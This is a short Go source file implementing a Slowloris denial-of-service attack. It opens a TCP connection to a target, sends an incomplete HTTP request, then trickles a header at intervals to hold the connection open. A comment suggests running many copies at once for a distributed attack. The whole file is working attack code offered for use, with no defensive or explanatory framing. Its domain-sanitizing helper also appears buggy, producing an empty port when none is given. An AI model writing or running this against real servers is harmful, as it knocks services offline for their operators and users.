package main

import (
	"context"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"
)

// Slowloris performs single threaded slow loris attack. If you want to run distributed
// attack, just run multiple calls of the function over the same URL.
func Slowloris(ctx context.Context, index int64, interval time.Duration, host string) error {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return err
	}

	requestLine := GetRequestLine()
	fmt.Println("Sending request line", requestLine)
	n, err := conn.Write([]byte(requestLine))
	if err != nil || n < len(requestLine) {
		return err
	}

	for {
		fmt.Printf("slowloris %d: send header\n", index)
		select {
		case <-ctx.Done():
			return nil
		case <-time.After(interval):
			header := RandomHeader()
			n, err := conn.Write([]byte(header))
			if err != nil || n < len(header) {
				return err
			}
		}
	}

	return nil
}

func GetRequestLine() string {
	return "GET / HTTP/1.1\r\n"
}

func RandomHeader() string {
	return "Foo: Bar\r\n"
}

func ClosingLine() string {
	return "\r\n"
}

// SanitizeDomain extracts the host from the URL
func SanitizeDomain(rawURL string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}

	if !strings.Contains(parsed.Host, ":") {
		return fmt.Sprintf("%s:%s", parsed.Host, parsed.Port()), nil
	}

	return parsed.Host, nil
}
